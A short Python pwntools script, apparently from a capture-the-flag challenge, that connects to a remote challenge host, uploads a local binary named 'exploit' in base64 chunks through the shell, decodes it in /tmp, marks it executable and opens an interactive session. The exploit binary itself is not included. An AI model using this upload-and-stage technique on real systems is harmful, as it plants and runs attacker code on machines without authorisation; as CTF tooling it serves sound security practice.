#!/usr/bin/env python3
import base64
import pwn
from pwn import context, process, log

context.log_level = 'info'

def run(cmd: bytes):
    p.sendlineafter(b"$ ", cmd)
    p.recvline()

with open("./exploit", "rb") as f:
    payload = base64.b64encode(f.read()).decode()

p = pwn.remote("unguessablechallsubdomain.polygl0ts.ch", 6777)  # remote
# p = process("./run.sh")

run('cd /tmp')

log.info("Uploading...")
for i in range(0, len(payload), 512):
    log.info(f"Uploading... {i:x} / {len(payload):x}")
    chunk = payload[i:i+512]
    run(f'echo "{chunk}" >> b64exp')

run('base64 -d b64exp > exploit')
run('rm b64exp')
run('chmod +x exploit')

p.interactive()
p.close()
